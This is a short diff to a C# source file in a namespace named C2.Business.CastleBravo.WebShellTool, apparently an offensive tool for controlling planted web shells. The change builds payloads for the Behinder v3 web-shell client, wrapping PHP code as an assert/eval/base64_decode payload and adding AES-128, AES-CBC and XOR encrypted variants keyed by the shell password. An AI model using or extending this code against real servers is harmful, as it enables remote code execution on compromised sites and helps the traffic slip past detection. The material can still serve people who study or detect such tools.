@@ -635,9 +635,14 @@ namespace C2.Business.CastleBravo.WebShellTool
             if (task.ClientVersion == "三代冰蝎") //目前只支持冰蝎php、aes加密报文
             {
                 string bxPayload = string.Format("assert|eval(base64_decode('{0}'));", ST.EncodeBase64(payload));
-                payloads.Add(ClientSetting.Encrypt(bxPayload, pass));
-                if (Regex.IsMatch(pass,"[a-f0-9]{16}"))
+                payloads.Add(ClientSetting.AES128Encrypt(bxPayload, pass));
+                payloads.Add(ClientSetting.XOREncrypt(bxPayload, pass));
+                if (Regex.IsMatch(pass, "[a-f0-9]{16}"))
+                {
                     payloads.Add(ST.AES128CBCEncrypt(bxPayload, pass));
+                    payloads.Add(ClientSetting.XOREncrypt(bxPayload, pass, false));
+                }                
+                   
             }
             else if (task.TrojanType != "自动判断")
             {
